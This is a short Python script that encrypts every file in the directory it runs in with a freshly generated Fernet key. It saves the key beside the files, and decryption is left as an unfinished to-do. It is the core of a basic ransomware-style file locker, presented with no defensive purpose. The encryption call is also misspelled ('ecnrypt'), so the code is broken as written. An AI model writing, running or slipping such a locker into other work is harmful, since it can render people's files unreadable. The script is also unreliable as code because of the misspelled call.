#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#find all files

files = []
for file in os.listdir():
    if file =="lock.py" or file =="secret.key":
        continue
    if os.path.isfile(file):
        files.append(file)
    
print(files)


key = Fernet.generate_key()

with open("secret.key","wb") as secret:
    secret.write(key)

#takes every file found and encrypts them
for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypt = Fernet(key).ecnrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypt)
        
#tod-o decryption